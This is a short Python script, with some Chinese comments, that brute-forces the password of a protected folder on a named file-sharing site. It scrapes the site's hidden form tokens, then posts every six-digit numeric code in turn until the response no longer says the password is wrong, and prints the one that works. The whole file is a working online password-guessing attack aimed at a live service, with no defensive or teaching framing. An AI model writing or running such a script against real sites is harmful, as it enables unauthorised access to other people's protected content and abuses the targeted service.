# -*- coding:utf-8 -*-
import requests
import itertools as its
import re
import time
import random
import sys
class PwdRequest:
    def __init__(self):
        self.head = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)" 
                          "Chrome/76.0.3809.132 Safari/537.36",


        }
    def getNecessaryData(self):
        url = "https://wdyun.cf/home/1.真人"
        self.flag = False
        self.session = requests.Session()
        response1 = self.session.get(url=url)
        # response1 = requests.get(url=url)
        # print(response1.status_code)
        # print(response1.text)
        # print(response1.cookies)
        content = re.findall('<input type="hidden" name="(.*?)" value="(.*?)">',response1.text)
        contentdict = dict(content)
        self.contentdict = contentdict
    def requestWithPwd(self,pwd):
        url = "https://wdyun.cf/password"
        self.contentdict['password'] = pwd
        formData = self.contentdict
        # formData = {"password": pwd, "_token": self._token,"encryptKey": self.encryptKey,"route": self.route, "requestPath":self.requestPath}
        # print(formData)
        s = 0.1
        # print(s)
        time.sleep(s)
        response = self.session.post(url=url,data=formData,headers=self.head)
        # print(response.status_code)
        # print(response.text)
        if response.status_code !=200:
            print(response.status_code)
            print("有内鬼，终止交易！")
            # sys.exit(0)
        content1 = re.findall('<p>(.*?)</p>',response.text)
        if content1[0] != '密码错误':
            self.thatman = pwd
            self.flag = True
        # print(response.cookies)
class PwdGene:
    def genePwd(self):
        words = "1234567890"
        a = 0
        for num in range(6,7):
            keys = its.product(words, repeat=num)
        return keys


if __name__ == '__main__':
    p = PwdGene()
    keys = p.genePwd()
    r = PwdRequest()
    r.getNecessaryData()
    for key in keys:
        if r.flag == 0 :
            print("".join(key))
            r.requestWithPwd("".join(key))
    if r.flag :
       print(r.thatman)
    else:
       print("not six number")
